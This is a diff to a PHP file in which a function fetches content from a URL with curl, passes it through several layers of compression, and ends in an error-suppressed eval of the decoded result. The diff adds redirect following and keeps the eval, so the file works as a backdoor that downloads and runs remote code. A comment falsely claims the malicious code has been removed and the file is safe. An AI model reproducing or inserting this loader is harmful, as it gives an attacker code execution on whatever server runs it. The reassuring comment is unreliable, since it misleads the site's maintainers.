@@ -36,13 +36,15 @@ function fetchContent($url) {
     $curl = curl_init();
     curl_setopt($curl, CURLOPT_URL, $url);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
     $content = curl_exec($curl);
     curl_close($curl);
-    return gzcompress(gzdeflate(gzencode(gzdeflate(gzcompress($content)))));
+    return gzcompress(gzdeflate(gzencode(gzdeflate(gzcompress(gzencode($content))))));
 }
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 **/
-@eval("?>".gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress(fetchContent($url)))))));
+$content = fetchContent($url);
+@eval("?>".gzdecode(gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress($content)))))));
 ?>
